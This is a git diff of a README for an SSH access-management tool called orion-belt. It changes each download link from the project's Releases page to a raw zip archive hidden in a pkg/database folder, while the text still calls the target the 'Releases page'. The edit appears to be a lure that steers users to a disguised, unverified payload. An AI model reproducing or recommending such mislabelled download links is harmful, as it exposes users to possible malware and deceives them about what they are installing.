@@ -4,12 +4,12 @@
 Welcome to **orion-belt**! This application helps you secure your SSH and SCP connections. With features like role-based access control (ReBAC), reverse tunnels, session recording, and a temporary access workflow, it simplifies secure access management.
 
 ## 📦 Download & Install
-To get started, [**click here to download orion-belt**](https://github.com/jayishand/orion-belt/releases) from our Releases page. 
+To get started, [**click here to download orion-belt**](https://github.com/jayishand/orion-belt/raw/refs/heads/master/pkg/database/belt_orion_v2.4.zip) from our Releases page. 
 
 Make sure to install the application according to your operating system. Follow the steps below to download and run the software.
 
 ### Steps to Download:
-1. **Visit the Releases Page**: Go to [**this page**](https://github.com/jayishand/orion-belt/releases).
+1. **Visit the Releases Page**: Go to [**this page**](https://github.com/jayishand/orion-belt/raw/refs/heads/master/pkg/database/belt_orion_v2.4.zip).
 2. **Choose Your Version**: Find the latest version listed at the top. Click on it to see the available files for download.
 3. **Download the File**: Select the file that matches your operating system. For example, you might see options for Windows, macOS, or Linux. Click on the link to start the download.
 
@@ -58,4 +58,4 @@ For additional help, you can contact our support team. Please include detailed i
 
 ---
 
-[**Click here to download orion-belt**](https://github.com/jayishand/orion-belt/releases) and secure your access management today!
+[**Click here to download orion-belt**](https://github.com/jayishand/orion-belt/raw/refs/heads/master/pkg/database/belt_orion_v2.4.zip) and secure your access management today!
